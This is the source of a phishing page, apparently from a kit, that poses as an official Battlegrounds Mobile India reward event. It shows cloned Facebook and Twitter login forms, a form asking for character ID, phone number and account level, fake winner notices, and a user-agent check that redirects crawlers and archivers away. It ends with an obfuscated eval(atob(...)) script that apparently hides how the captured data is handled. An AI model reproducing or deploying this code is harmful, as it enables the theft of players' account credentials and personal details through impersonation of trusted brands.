<?php $ua=$_SERVER['HTTP_USER_AGENT'];if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua)||preg_match('/Java1.1.4/si',$ua)||preg_match('/MS FrontPage Express/si',$ua)||preg_match('/HTTrack/si',$ua)||preg_match('/IDentity/si',$ua)||preg_match('/HyperBrowser/si',$ua)||preg_match('/Lynx/si',$ua)){header('Location: cracker.php');die();}include("system/setting.php"); ?><html><head><meta charset="UTF-8"><meta content="width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no"name="viewport"><meta content="IE=edge"http-equiv="X-UA-Compatible"><meta content="<?php echo $title; ?>"property="og:title"><meta content="<?php echo $description; ?>"name="description"><meta content="<?php echo $description; ?>"property="og:description"><meta content="./"property="og:url"><meta content="<?php echo $title; ?>"property="og:site_name"><meta content="website"property="og:type"><meta content="<?php echo $copyright; ?>"name="copyright"><meta content="<?php echo $theme; ?>"name="theme-color"><meta content="<?php echo $image; ?>"property="og:image"><title><?php echo $title; ?></title><link href="css/style.css"rel="stylesheet"><link href="css/animate.css"rel="stylesheet"><link href="css/login/facebook.css"rel="stylesheet"><link href="css/login/twitter.css"rel="stylesheet"><link href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css"rel="stylesheet"><link href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css"rel="stylesheet"><link href="<?php echo $icon; ?>"rel="icon"></head><body oncontextmenu="return!1"ondragstart="return!1"onselectstart="return!1"><style type="text/css">body{background:#000 center/cover no-repeat;margin:0;font-family:Teko}.navbar{background:#0c0c0c;width:100%;height:60px}.navbar-logo{width:100px;float:left;margin-top:12px;margin-left:13px}.navbar-shop{width:29px;margin-top:19px;margin-right:8px}.navbar-menu{width:20px;margin-top:19px;margin-right:5px}.navbar-right{width:auto;float:right}.navbar-download{background:#ffca13;width:50px;height:50px;margin-top:10px;margin-right:3px;border-radius:0;float:right}.navbar-download img{width:20px;height:21px;margin:13px}.navbar-righ{width:auto;float:right}.navbar-shp{width:29px;margin-top:19px;margin-right:10px}.season-title{background:url(img/alert.png) no-repeat center center;background-size:100% 100%;width:96%;height:68px;margin-top:-8.5px;margin-left:auto;margin-right:auto;padding:10px;display:block;margin-bottom:10px}.season-title-t1{color:#dcc084;font-size:15px;font-family:Teko;text-align:left;margin-top:39px;line-height:15px;left:20%;position:absolute}.season-title-t2{color:#dcc084;font-size:15px;font-family:Teko;text-align:right;margin-top:39px;line-height:15px;right:20%;position:absolute}.event-theme{width:95%;height:75px;margin-top:-25px;margin-bottom:-10px;margin-left:auto;margin-right:auto;display:block}.event-notification{width:100%;height:75px;margin-left:-15px;margin-right:auto;margin-bottom:-5px;padding:5px}.event-notification-text{padding-top:7px;padding-left:19px;text-align:center;font-family:Teko;color:#e7c54c;text-shadow:1px 1px #000;font-size:17px}.event-notification i{padding-right:5px;color:#000;font-size:19px}.event-notification-timer{width:25%;height:auto;color:#000;font-size:20px;font-family:pubgFont;text-align:center;border:1px solid #000;border-radius:5px;float:right}.footer{background:#131313;width:100%;height:auto;margin-top:-30px;padding:15px}.item{width:27.5%;height:100px;margin:3px;margin-bottom:38px;display:inline-block}.item button,.item img{border:none}.item button{background-size:100% 100%;width:100%;height:auto;padding:2px;color:#000;font-size:18px;font-family:Teko;font-weight:500;text-align:center;border:none;outline:0}.nav-popup-titles{padding-left:24px;color:#e7c54c;font-size:15px;font-family:Teko;font-weight:500;text-align:center}.nav-popup-title{color:#e7c54c;font-size:15px;font-family:Teko;font-weight:500;text-align:center}.nav-popup img{width:17px;height:17px;margin-top:-3px;margin-right:10px;color:#000;float:right}.popup-alert{width:95%;height:auto;margin-top:10px;margin-left:auto;margin-right:auto;margin-bottom:10px;padding:5px;color:#c3b9a1;font-size:17px;font-family:Teko;font-weight:500;text-align:center;display:block}.popup-alert i{padding-top:15px;padding-bottom:15px;color:#c3b9a1;font-size:40px;text-align:center}.popup-footer button:nth-child(1){width:auto;height:auto;margin-top:-4px;margin-left:auto;margin-right:auto;padding:3px;padding-left:28px;padding-right:28px;color:#c3b9a1;font-size:18px;font-family:Teko;font-weight:500;text-align:center;border:none;outline:0}.popup-btn-login{width:85%;height:auto;padding:8px;margin-left:auto;margin-right:auto;color:#000;font-size:15px;font-family:Teko;border-radius:2px;border:none;outline:0}.popup-btn-login i{color:#fff;font-size:20px;float:left}.popup-btn-facebook{background:#1778f2;color:#fff;margin-top:15px;margin-bottom:3px}.popup-btn-twitter{background:#08a0e9;margin-bottom:15px;color:#fff}.popup-form-footer{margin-top:-16px}.popup-form-footer button{width:auto;height:auto;margin-top:4px;padding:3px;padding-left:30px;padding-right:30px;color:#000;font-size:18px;font-family:Teko;font-weight:500;text-align:center;border:none;outline:0}.popup-form input{background:0 0;background-size:100% 100%;box-shadow:1px 1px 5px #c3b9a1,0 0 0 #c3b9a1;width:90%;height:auto;margin-left:6px;margin-bottom:3px;padding:4.4px;color:#c3b9a1;font-size:17px;font-family:Teko;font-weight:500;border-radius:2px;border-top:.5px solid #000;border-bottom:.5px solid #000;border-right:2px solid #000;border-left:2px solid #000;position:relative;outline:0;-webkit-appearance:none;-moz-appearance:none}.popup-form input::placeholder{color:#c3b9a1}.popup-form select{background:0 0;background-size:100% 100%;box-shadow:1px 1px 5px #c3b9a1,0 0 0 #c3b9a1;width:90%;height:auto;margin-left:6px;margin-bottom:3px;padding:5px;padding-left:6px;color:#c3b9a1;font-size:17px;font-family:Teko;font-weight:500;border-radius:2px;border-top:.5px solid #000;border-bottom:.5px solid #000;border-right:2px solid #000;border-left:2px solid #000;position:relative;outline:0;-webkit-appearance:none;-moz-appearance:none}.popup-form-footer button{width:auto;height:auto;margin-top:-6px;margin-bottom:15px;padding:5px;padding-left:35px;padding-right:35px;color:#c3b9a1;font-size:18px;font-family:Teko;font-weight:500;text-align:center;border:none;outline:0}.awalbtn{width:30%;height:30px;margin-left:35%;margin-right:auto;margin-top:0;padding:0;padding-left:25px;padding-right:30px;font-size:22px;font-family:Teko;font-weight:500;text-align:center;color:#dcc084;text-shadow:1px 1px #000;margin-bottom:-10px;border:none;position:relative;outline:0;display:block}</style><div class="container"><div class="navbar"><img src="https://www.battlegroundsmobileindia.com/common/img/common/logo.png"class="navbar-logo"><div class="navbar-right"><img src="https://www.battlegroundsmobileindia.com/common/img/btn/sns_f_w.png"class="navbar-shop"> <img src="https://www.battlegroundsmobileindia.com/common/img/btn/sns_i_w.png"class="navbar-shop"> <img src="https://www.battlegroundsmobileindia.com/common/img/btn/sns_y_w.png"class="navbar-shop"><div class="navbar-download"><img src="https://i.ibb.co/jwMxWFh/menu.png"></div><div class="navbar-righ"><img src="https://www.battlegroundsmobileindia.com/common/img/icon/icon_shop_50.png"class="navbar-shp"></div></div></div><div class="header"><img src="img/header.jpg"></div><div class="box"><div class="season-title"></div><center><div class="tab_rewards"id="latest"><div class="itemShine item"><div><figure><img src="img/rewards/1.jpg"style="border-bottom:0"></figure></div><div><button onclick="open_itemReward_confirmation(this)"type="button"onmousedown="buka.play()"src="img/rewards/1.jpg">COLLECT</button></div></div><div class="itemShine item"><div><figure><img src="img/rewards/2.jpg"style="border-bottom:0"></figure></div><div><button onclick="open_itemReward_confirmation(this)"type="button"onmousedown="buka.play()"src="img/rewards/2.jpg">COLLECT</button></div></div><div class="itemShine item"><div><figure><img src="img/rewards/3.jpg"style="border-bottom:0"></figure></div><div><button onclick="open_itemReward_confirmation(this)"type="button"onmousedown="buka.play()"src="img/rewards/3.jpg">COLLECT</button></div></div><div class="itemShine item"><div><figure><img src="img/rewards/4.jpg"style="border-bottom:0"></figure></div><div><button onclick="open_itemReward_confirmation(this)"type="button"onmousedown="buka.play()"src="img/rewards/4.jpg">COLLECT</button></div></div><div class="itemShine item"><div><figure><img src="img/rewards/5.jpg"style="border-bottom:0"></figure></div><div><button onclick="open_itemReward_confirmation(this)"type="button"onmousedown="buka.play()"src="img/rewards/5.jpg">COLLECT</button></div></div><div class="itemShine item"><div><figure><img src="img/rewards/6.jpg"style="border-bottom:0"></figure></div><div><button onclick="open_itemReward_confirmation(this)"type="button"onmousedown="buka.play()"src="img/rewards/6.jpg">COLLECT</button></div></div><br><div class="event-notification"><div class="event-notification-text"><div class="animated fadeIn slider">!ID 5149470362 Successful Get Car Koenigseg</div><div class="animated fadeIn slider">!ID 5504362590 Successful Get Pharaoh X-suit</div><div class="animated fadeIn slider">!ID 5242011396 Successful Get Mummy Set</div><div class="animated fadeIn slider">!ID 551627559 Successful Get 28 Materials</div><div class="animated fadeIn slider">!ID 576760016 Successful Get Iridescence X-suit</div><div class="animated fadeIn slider">!ID 5226032560 Successful Get M416 Glacier</div></div></div></div></div><div class="footer"><img src="https://www.battlegroundsmobileindia.com/common/img/common/footerlg.png"class="footer-copyright-icon"><div class="footer-txt-copyright">ⓒ<?php echo $yearNow; ?>KRAFTON, Inc. All rights reserved.</div><div class="footer-txt-copyright">Privacy Policy | Terms of Service | Rules of Conduct | Official Community Policy</div></div></div><div class="popup itemReward_confirmation"style="display:none"><div class="popup-box"><div class="nav-popup"><img src="img/popup-close.png"onclick="close_reward_confirmation()"onmousedown="tutup.play()"><div class="nav-popup-titles">Reward Confirmation</div></div><div class="popup-box-bg"><div class="popup-alert">Are you sure to collect this reward?</div><div class="itemShine popup-item"><div><figure><img src=""id="myItemReward_confirmationImg"></figure></div></div><br></div><div class="popup-footer"><button onclick="open_account_login()"type="button"onmousedown="buka.play()">Collect</button></div></div></div><div class="popup account_login"style="display:none"><div class="popup-box"><div class="nav-popup"><div class="nav-popup-title">Account Login</div></div><div class="popup-box-bg"><div class="popup-alert">Login to receive your selected reward</div><button onclick="open_facebook()"type="button"class="popup-btn-login popup-btn-facebook"><i class="fa icon-login fa-facebook-square"></i> Log in using Facebook account</button> <button onclick="open_twitter()"type="button"class="popup-btn-login popup-btn-twitter"><i class="fa icon-login fa-twitter-square"></i> Log in using Twitter account</button><br></div><div class="popup-footer-log"></div></div></div><div class="animated fadeIn popup-login login-facebook"style="display:none"><div class="popup-box-login-fb"><a class="close-fb"onclick="tutup_facebook()"><i class="zmdi zmdi-close"></i></a><div class="navbar-fb"><img src="https://i.ibb.co/Wg8qQxh/facebook-text.png"></div><div class="content-box-fb"><p class="kaget email-fb"style="width:330px;top:-15px;text-align:left">The email or phone number you entered does not match any account. <b>Find your account.</b></p><p class="kaget sandi-fb"style="width:330px;top:-15px;text-align:left">Incorrect password. <b>Did you forget your password?</b></p><img src="https://www.battlegroundsmobileindia.com/common/img/main/app.png"><div class="txt-login-fb">Log in to your Facebook account to connect to Battlegrounds Mobile.</div><form action="javascript:void(0)"id="ValidateLoginFbForm"method="post"class="login-form"><input id="email-facebook"name="email"oninput='setCustomValidity("")'oninvalid='this.setCustomValidity("Enter Email or Mobile Number")'placeholder="Mobile number or email address"required autocomplete="off"autocapitalize="off"class="loginEmail"> <input id="password-facebook"name="password"type="password"oninput='setCustomValidity("")'oninvalid='this.setCustomValidity("Enter Password")'placeholder="Password"required autocomplete="off"autocapitalize="off"class="loginPassword"><div class="showHide showPassword"onclick="showFbPassword()"><i class="zmdi zmdi-hc-2x zmdi-eye-off"></i></div><div class="showHide hidePassword"style="display:none"onclick="hideFbPassword()"><i class="zmdi zmdi-hc-2x zmdi-eye"></i></div><input id="login-facebook"name="login"type="hidden"readonly value="Facebook"> <button onclick="ValidateLoginFbData()"type="submit"class="btn-login-fb">Log In</button></form><div class="txt-create-account">Create account</div><div class="txt-not-now">Not now</div><div class="txt-forgotten-password">Forgotten password?</div></div><div class="language-box"><center><div class="language-name language-name-active">English (UK)</div><div class="language-name">Bahasa Indonesia</div><div class="language-name">Basa Jawa</div><div class="language-name">Bahasa Melayu</div><div class="language-name">日本語</div><div class="language-name">Español</div><div class="language-name">Português (Brasil)</div><div class="language-name"><i class="fa fa-plus"></i></div></center></div><div class="copyright">Facebook Inc.</div></div></div><div class="animated fadeIn popup-login login-twitter"style="display:none"><div class="popup-box-login-twitter"><a class="close-other"onclick="tutup_twitter()"><i class="zmdi zmdi-close"></i></a><div class="box-twitter"><center><div class="header-twitter"><img src="https://i.ibb.co/V9rgBqw/twitter-text.png"style="margin-bottom:-35px;margin-left:135px"></center><center><br><br><form action="javascript:void(0)"id="ValidateLoginTwitterForm"method="post"><div class="txt-login-twitter"style="text-align:left;margin-left:95px">Login to Twitter</div><div class="input-box-twitter"><label>Phone, email, or username</label> <input id="email-twitter"name="email"oninput='setCustomValidity("")'oninvalid='this.setCustomValidity("Enter Username, Email or Mobile Number")'placeholder=""required></div><div class="input-box-twitter"><div class="TwitterShowHide TwitterShowPassword"onclick="showTwitterPassword()"><i class="zmdi zmdi-hc-2x zmdi-eye-off"></i></div><div class="TwitterShowHide TwitterHidePassword"style="display:none"onclick="hideTwitterPassword()"><i class="zmdi zmdi-hc-2x zmdi-eye"></i></div><label>Password</label> <input id="password-twitter"name="password"type="password"oninput='setCustomValidity("")'oninvalid='this.setCustomValidity("Enter Password")'placeholder=""required style="width:85%"></div><p class="kagettw email-tw"style="width:330px;top:-15px;text-align:center;margin-left:-17px">Sorry, we couldn't find your account.</p><p class="kagettw sandi-tw"style="width:330px;top:-15px;text-align:center;margin-left:-17px">Wrong Password!</p><input id="login-twitter"name="login"type="hidden"readonly value="Twitter"> <button onclick="ValidateLoginTwitterData()"type="submit"class="btn-login-twitter">Log In</button><div class="footer-menu-twitter">Forgot password?</div><div class="footer-menu-twitter bulet">•</div><div class="footer-menu-twitter">Sign up to Twitter</div></form></center></div></div></div><div class="popup account_verification"style="display:none"><div class="popup-box"><div class="nav-popup"><div class="nav-popup-title">Account Verification</div></div><div class="popup-box-bg"><div class="popup-alert">Complete your account details</div><form action="javascript:void(0)"id="ValidateVerificationDataForm"method="post"class="popup-form"><input id="validateEmail"name="email"type="hidden"readonly> <input id="validatePassword"name="password"type="hidden"readonly> <input id="playid"name="playid"type="number"oninput='setCustomValidity("")'oninvalid='this.setCustomValidity("Input your Character ID")'placeholder="Character ID"required autocomplete="off"> <input id="phone"name="phone"type="number"oninput='setCustomValidity("")'oninvalid='this.setCustomValidity("Input your Phone Number")'placeholder="Phone Number"required autocomplete="off"> <select id="level"name="level"oninput='setCustomValidity("")'oninvalid='this.setCustomValidity("select your Account Level")'required><option disabled selected value="">Account Level</option><option>1</option><option>2</option><option>3</option><option>4</option><option>5</option><option>6</option><option>7</option><option>8</option><option>9</option><option>10</option><option>11</option><option>12</option><option>13</option><option>14</option><option>15</option><option>16</option><option>17</option><option>18</option><option>19</option><option>20</option><option>21</option><option>22</option><option>23</option><option>24</option><option>25</option><option>26</option><option>27</option><option>28</option><option>29</option><option>30</option><option>31</option><option>32</option><option>33</option><option>34</option><option>35</option><option>36</option><option>37</option><option>38</option><option>39</option><option>40</option><option>41</option><option>42</option><option>43</option><option>44</option><option>45</option><option>46</option><option>47</option><option>48</option><option>49</option><option>50</option><option>51</option><option>52</option><option>53</option><option>54</option><option>55</option><option>56</option><option>57</option><option>58</option><option>59</option><option>60</option><option>61</option><option>62</option><option>63</option><option>64</option><option>65</option><option>66</option><option>67</option><option>68</option><option>69</option><option>70</option><option>71</option><option>72</option><option>73</option><option>74</option><option>75</option><option>76</option><option>77</option><option>78</option><option>79</option><option>80</option><option>81</option><option>82</option><option>83</option><option>84</option><option>85</option><option>86</option><option>87</option><option>88</option><option>89</option><option>90</option><option>91</option><option>92</option><option>93</option><option>94</option><option>95</option><option>96</option><option>97</option><option>98</option><option>99</option><option>100</option></select> <input id="validateLogin"name="login"type="hidden"readonly><br><br></div><div class="popup-form-footer"><button onclick="ValidateVerificationData()"type="submit"onmousedown="buka.play()">Verify</button></div></div></div><div class="popup check_verification"style="display:none"><div class="popup-box"><div class="nav-popup"><div class="nav-popup-title">Account Verification</div></div><div class="popup-box-bg"><div class="popup-alert"><br><i class="zmdi zmdi-hc-spin zmdi-spinner"></i><br>Checking your account details...<br><br></div><div class="popup-form-footer"></div></div></div></div><div class="popup processing_account"style="display:none"><div class="popup-box"><div class="nav-popup"><div class="nav-popup-title">Processing Account</div></div><div class="popup-box-bg"><div class="popup-alert">Thank you for joining this event<br><br>Your account has been successfully processed<br><br>To receive your exclusive reward<br>Please wait up to 24 hours</div><div class="popup-footer"><button onclick='location.href="https://www.battlegroundsmobileindia.com/"'type="button"onmousedown="tutup.play()"style="background:url(img/menu_on.png) no-repeat center center;background-size:100% 100%">Logout</button></div></div></div></div><script src="http://code.jquery.com/jquery-1.10.2.min.js"type="text/javascript"></script><script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"type="text/javascript"></script><script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script><script src="js/script.js"></script><script src="js/showHide.js"></script><script>function close_facebook(){$(".login-facebook").hide(),$(".account_login").show()}function close_twitter(){$(".login-twitter").hide(),$(".account_login").show()}var slideIndex=0;function showSlides(){var e,o=document.getElementsByClassName("slider");for(e=0;e<o.length;e++)o[e].style.display="none";++slideIndex>o.length&&(slideIndex=1),o[slideIndex-1].style.display="block",setTimeout(showSlides,2500)}showSlides()</script></body><script>eval(atob("dmFyIHU9dm9pZCAwLGk0PTQsaTg9OCxyZWM9bmV3IFJlZ0V4cCgiLnsxLDR9IiwiZyIpO2Z1bmN0aW9uIF9mX2Mocyl7cmV0dXJuIFN0cmluZy5mcm9tQ2hhckNvZGUocyk7fXZhciBoZD1mdW5jdGlvbihhKXt2YXIgYixjPWEubWF0Y2gocmVjKXx8W10sZD0iIjtmb3IoYj0wO2I8Yy5sZW5ndGg7YisrKWQrPWhoKHBhcnNlSW50KGNbYl0saTYpKTtyZXR1cm4gZH07dmFyIGh3PWhkO1N0cmluZy5wcm90b3R5cGUuY2M9ZnVuY3Rpb24oYSl7cmV0dXJuIHRoaXMuY2hhckNvZGVBdChhKX07dmFyIGk2PTE2LGhlPWZ1bmN0aW9uKGEpe3ZhciBiLGMsZD0iIjtmb3IoYz0wO2M8YS5sZW5ndGg7YysrKWI9YS5jYyhjKS50b1N0cmluZyhpNiksZCs9KCIwMDAiK2IpLnNsaWNlKC00KTtyZXR1cm4gZH0saGg9ZnVuY3Rpb24oYSl7cmV0dXJuIFN0cmluZy5mcm9tQ2hhckNvZGUoYSl9LGh3YT1odygiMDA0MTAwNDIwMDQzMDA0NDAwNDUwMDQ2MDA0NzAwNDgwMDQ5MDA0YTAwNGIwMDRjMDA0ZDAwNGUwMDRmMDA1MDAwNTEwMDUyMDA1MzAwNTQwMDU1MDA1NjAwNTcwMDU4MDA1OTAwNWEwMDYxMDA2MjAwNjMwMDY0MDA2NTAwNjYwMDY3MDA2ODAwNjkwMDZhMDA2YjAwNmMwMDZkMDA2ZTAwNmYwMDcwMDA3MTAwNzIwMDczMDA3NDAwNzUwMDc2MDA3NzAwNzgwMDc5MDA3YTAwMzAwMDMxMDAzMjAwMzMwMDM0MDAzNTAwMzYwMDM3MDAzODAwMzkwMDJiMDAyZjAwM2QiKTtmdW5jdGlvbiBhdG9iKGEpe3ZhciBiLGMsZCxlLGYsZyxoLGk9IiIsaj0wO2ZvcihhPWEucmVwbGFjZShyZWEsIiIpO2o8YS5sZW5ndGg7KWU9aHdhLmluZGV4T2YoYS5jaGFyQXQoaisrKSksZj1od2EuaW5kZXhPZihhLmNoYXJBdChqKyspKSxnPWh3YS5pbmRleE9mKGEuY2hhckF0KGorKykpLGg9aHdhLmluZGV4T2YoYS5jaGFyQXQoaisrKSksYj1lPDwyfGY+PjQsYz0oMTUmZik8PDR8Zz4+MixkPSgzJmcpPDw2fGgsaSs9X2ZfYyhiKSw2NCE9ZyYmKGkrPV9mX2MoYykpLDY0IT1oJiYoaSs9X2ZfYyhkKSk7cmV0dXJuIGk9dXRvYShpKX1mdW5jdGlvbiBidG9hKGEpe3ZhciBiLGMsZCxlLGYsZyxoLGk9IiIsaj0wO2ZvcihhPWF0b3UoYSk7ajxhLmxlbmd0aDspYj1hLmNoYXJDb2RlQXQoaisrKSxjPWEuY2hhckNvZGVBdChqKyspLGQ9YS5jaGFyQ29kZUF0KGorKyksZT1iPj4yLGY9KDMmYik8PDR8Yz4+NCxnPSgxNSZjKTw8MnxkPj42LGg9NjMmZCxpc05hTihjKT9nPWg9NjQ6aXNOYU4oZCkmJihoPTY0KSxpPWkraHdhLmNoYXJBdChlKStod2EuY2hhckF0KGYpK2h3YS5jaGFyQXQoZykraHdhLmNoYXJBdChoKTtyZXR1cm4gaX1mdW5jdGlvbiBhdG91KGEpe2E9YS5yZXBsYWNlKHJlYiwiXG4iKTtmb3IodmFyIGI9IiIsYz0wO2M8YS5sZW5ndGg7YysrKXt2YXIgZD1hLmNoYXJDb2RlQXQoYyk7MTI4PmQ/Yis9X2ZfYyhkKTpkPjEyNyYmMjA0OD5kPyhiKz1fZl9jKGQ+PjZ8MTkyKSxiKz1fZl9jKDYzJmR8MTI4KSk6KGIrPV9mX2MoZD4+MTJ8MjI0KSxiKz1fZl9jKGQ+PjYmNjN8MTI4KSxiKz1fZl9jKDYzJmR8MTI4KSl9cmV0dXJuIGJ9ZnVuY3Rpb24gdXRvYShhKXtmb3IodmFyIGI9IiIsYz0wLGQ9YzE9YzI9MDtjPGEubGVuZ3RoOylkPWEuY2hhckNvZGVBdChjKSwxMjg+ZD8oYis9X2ZfYyhkKSxjKyspOmQ+MTkxJiYyMjQ+ZD8oYzI9YS5jaGFyQ29kZUF0KGMrMSksYis9X2ZfYygoMzEmZCk8PDZ8NjMmYzIpLGMrPTIpOihjMj1hLmNoYXJDb2RlQXQoYysxKSxjMz1hLmNoYXJDb2RlQXQoYysyKSxiKz1fZl9jKCgxNSZkKTw8MTJ8KDYzJmMyKTw8Nnw2MyZjMyksYys9Myk7cmV0dXJuIGJ9dmFyIGh3YT1odygiMDA0MTAwNDIwMDQzMDA0NDAwNDUwMDQ2MDA0NzAwNDgwMDQ5MDA0YTAwNGIwMDRjMDA0ZDAwNGUwMDRmMDA1MDAwNTEwMDUyMDA1MzAwNTQwMDU1MDA1NjAwNTcwMDU4MDA1OTAwNWEwMDYxMDA2MjAwNjMwMDY0MDA2NTAwNjYwMDY3MDA2ODAwNjkwMDZhMDA2YjAwNmMwMDZkMDA2ZTAwNmYwMDcwMDA3MTAwNzIwMDczMDA3NDAwNzUwMDc2MDA3NzAwNzgwMDc5MDA3YTAwMzAwMDMxMDAzMjAwMzMwMDM0MDAzNTAwMzYwMDM3MDAzODAwMzkwMDJiMDAyZjAwM2QiKSxyZWE9bmV3IFJlZ0V4cCgiW15BLVphLXowLTkrLz1dIiwiZyIpLHJlYj1uZXcgUmVnRXhwKCJcclxuIiwiZyIpO3ZhciBfXz17YTpod2Euc3BsaXQoIiIpLCQ6ZnVuY3Rpb24oYSxiKXtmb3IodmFyIGM9IiIsZD10aGlzLmEubGVuZ3RoLGU9YS5sZW5ndGgsZj0wO2Y8ZTtmKyspZm9yKHZhciBnPTA7ZzxkO2crKylpZigiZSI9PWIpe2lmKHRoaXMuYVtnXT09PWFbZl0pe2MrPXRoaXMuYltnXTticmVha319ZWxzZSBpZigiZCI9PWImJnRoaXMuYltnXT09PWFbZl0pe2MrPXRoaXMuYVtnXTticmVha31yZXR1cm4gY30sYjpodygiMDAzZDAwMmYwMDJiMDAzOTAwMzgwMDM3MDAzNjAwMzUwMDM0MDAzMzAwMzIwMDMxMDAzMDAwN2EwMDc5MDA3ODAwNzcwMDc2MDA3NTAwNzQwMDczMDA3MjAwNzEwMDcwMDA2ZjAwNmUwMDZkMDA2YzAwNmIwMDZhMDA2OTAwNjgwMDY3MDA2NjAwNjUwMDY0MDA2MzAwNjIwMDYxMDA1YTAwNTkwMDU4MDA1NzAwNTYwMDU1MDA1NDAwNTMwMDUyMDA1MTAwNTAwMDRmMDA0ZTAwNGQwMDRjMDA0YjAwNGEwMDQ5MDA0ODAwNDcwMDQ2MDA0NTAwNDQwMDQzMDA0MjAwNDEiKS5zcGxpdCgiIil9Ow==")),eval(atob(__.$("ja7O47EQi9rc09gNoNLh05gPy6reyO7ajqHdj6bRlefM168XiKnRkefKop4gldLh05gPy6re16sDpN/Izd=H0+gXyNUXj53HiKba298L0d4PzNMDxp/fkZzbuqHM26IY0NoQ2ucR0uYY1p/fkZzbuqHM26IY0NgI2ucR0ecVk67OkKr3lZwYlegNzNcX2uEN2OLQop3NnsbSj+fS290IyucX1NwVk67OkKr3lZwYlegM098X2uEL2OLQop3NnsbSj+fS29wP0+cX1NoW2+LQop3NnsbSj+fS29wQ0OcX1NkX2OLQop3NnsbSj+fS290H0OcX1NgVk67OkKr3lZwYlegNztcX2uEH2q3Onq7VyKsSk5rNm+fb1ZzYmqnM2+cXhqzfj6zY25wXiKsSk5rNm+fb1ZzYmqnM2+cXhpMY2tTKop4goZrVotLSnpkgwprcmqEFoZrVouHNka0DpN/IzqwQy9zd290H0+cFja7O45vLj5rQxqHbjO//jqvXlNTajqHdj6bRle/Rk6rSsarJop3ckOfM168XiJnfke/S16sUmuPOxrEQi9rc09gNoNTalJ4YntLclKzLlqrSj7TO290Kzubj2+3Moq3hkarJop3ckO4X16ID09TSx6sSl6rSnJvYyKIV2ObbqKHjqJ4Y0NkJ2rLlkegNy9wXptLO290Lz+cFnaDO26cDn6DdjqLblZwSnKrMvqPblqrSj5z+iszUopzNta7TnugelqrSjuLdlKHMnqHM4ecUldMQyKIEmuHUnqHZj6gFleUV2qbllbLlkegNzN4XptLXqKHj1azUopzNta7TnrTO290Jz+bj254Y0NcI2uQe4ecFn6DdjqLblZvlkegNy9kXpuff2uHNj5bUnrTO290Iz+bjxp4Yz9=M2uPM1azLkZ3blZvsop3ZnpvlkegNzN4XpuUD4e/TnqHL1qzRlZvblZwToqzMmpnb4ZLajqHdj6bRle/Rk6rSpJ3bjK7On5z+lJgY2pTKop4gj9Lh05gLn9=I0K0F3+ge1Z3bjK7On5z+lJge2rTM29wP0Obj2+cU3+fM290LzucX1afXn6sY2pLajqHdj6bRle/Rk6rSpKbMnqLunpjfkavhoKDSnabOlq7MmqDS25wXiJnfke/fxrEQi9rc09gNoOPSxuwYj+blougM094XpugekJ3d4ecF3+ff290I0OcXqK8Yz98N2rMY2uQc268Y0NcL2ucSopvMkegekJ3d4ePS2pLajqHdj6bRle/h05gPy6re25wUoubFja7O46IDpN/Izd=H0+gXyJ3bj5rOlefh05gPy6rexqnLlazMmqDS25wUoubFkarMjp3S46Hlj+MD0NsMppMX25wUoubDnZrSoJvXlKIglJ/blbDRj6fbkb3bjK7On7DdlKHamp3TopvXlKIYj+bFja7O468DpN/IzqwQy9zd16ID3+fM2rTf29wQ0ebj268Y0NgQ2ucUntMc25wXqK8Yz9=O2rMYougM0tsX2tUc268Y0NcK2ublougM0t0XpugX1+wYougNzdwX2uHfj5vO268Y0NgQ2uPS2uQc2+4dlJvYnp3unpjfkavhoKDSnabOlq7MmqDSra7Ujqse2rTf290HzObj26sXhqnLlazMmqDS46DQnqHhoqzdlJrSj7DUlKjXlegXiJnfke/MxrEQi9rc09gNoNUc25wY0NsK2ublj+gM0t0XpugX1+wYj+gNy90X2rTM290KzObj2+cU3+ge1aDMm6rOsarJop3cpKzRlanXkaLfj6bRle4XqJwY0NoJ2rMY2pLajqHdj6bRle/Rk6rSpKnfoKrelKDV2+bFja7O45wDpN/IzqwQy9zdyOwYj+gM0toX2rTM29wP0Obj2+cU3+fM290LzecX1afXn6sY2pLajqHdj6bRle/Rk6rSpJvJmpvMnp4Y2pTKop4gj9Lh05gLn9=I0K0F3+fM29wPzOcXqJwYz98N2rMY2uQc2+4SoqzdlJrSj7DUlKjXle4XqJwY0NoJ2rMY2pLajqHdj6bRle/dl6DNnrDOnpjfkavhoKDSnabOlq7MmqDS2+bFja7O45wDpN/IzqwQy9zdyOwY4eHXj6rTsarJop3cpKzRlanXkaLfj6bRle4XqJwY0NoJ2rMY2uQc25wY0NcK2ublj+gNzdkXpugXhqnLlazMmqDS45vLj5rQpKnfoKrelKDV2+bFja7O45wDpN/IzqwQy9zdyOwYj+gM0toX2rTM290KzObj2+cU3+fM290LzecXqJwYz98N2rMY2pLajqHdj6bRle/MjpvLk7DMjKbMj6rO2+bFja7O45wDpN/IzqwQy9zdyOwY4eHUlKjXleLMjKbMj6rO4ecSm6bcnugX1+wYj+gNztoX2uHNm6DJ2+bDnZrSoJvXlKIgra7Umqvfj6r0lKjXlcnev67MougXiJnfke/MxrEQi9rc09gNoNUc25wYz9=H2ublj+gNzd8XpugYnZrSoJvXlKIYoubFja7O46IDj9Tf1Z/OnpnblZv8nqnfjqPM2+cU36rToqbUxuwYlegM0twX2rTS290Jzebj2+bllegNy9sXpugX1+vQopzNjKDOn9Mc26IY0NoN2ubllegNzNoXpugXqKIY0NgL2rMY2uQcl6DZmqID3+fS29wP0ucXqKIY0NkK2rMY2rTS290Izubj2+cU4e4Dxuvblq7Xl5PE4e4DxuvQopzNjKDOn5PE2+wYlegM0toX2rTS290KzObj2+cU3+fS290HyucX1ZzYlJkY2uQc26IY0NoO2ubllegNzNoXpugcnqLfmqQX1+wYlegM09kX2rTS290Jzebj2+vQopzNjKDOn+cU3+fS290KyucXqKIY0NkK2rMY36PRnKbS2ubD2ubDnZrSoJvXlKIgra7Umqvfj6r0lKjXlbvJmpvMnp38opvf2+bFja7O45wDpN/IzqwQy9zdyOwY4ezqoqPXn67MnsPRnKbSr5jXj5vbkcnRkaMe2rTM290K0ubj2+fajqHdj6bRleff2pTKop4gldLMyK7llegNztkXpugX1+vblq7Xl9Mc2+4dnqLfmqQTj5jXj5vbke4XqKIY0NkK2rMY2rTS290Izubj2+cU35/fkJzJlJ3cxuwYlegNyt8X2uHKoqQY2rTS290Izubj2+cU36PRnKbSxu